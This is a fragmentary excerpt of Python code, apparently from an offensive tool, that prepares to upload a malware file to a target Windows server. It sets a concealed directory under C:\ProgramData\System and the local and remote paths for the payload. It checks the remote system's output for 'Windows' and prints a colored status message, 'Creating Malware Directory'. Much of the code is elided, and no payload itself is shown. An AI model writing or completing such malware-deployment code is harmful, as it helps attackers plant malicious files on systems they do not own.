...
remote_directory = "C:\\ProgramData\\System" # Create directory on target 
windows_local_path = "Files/" + malware  # File to upload on windows server
windows_remote_path = "C:\\ProgramData\\System\\" + malware # Path to write file to on target server
    ...
    try:
        ...
        if 'Windows' in stdout.read().decode():
            ...
            try:
	            ...
	            print(Fore.RED + "    └──=> " + Fore.BLUE + orange + Fore.WHITE + "Creating Malware Directory" + Fore.RESET)
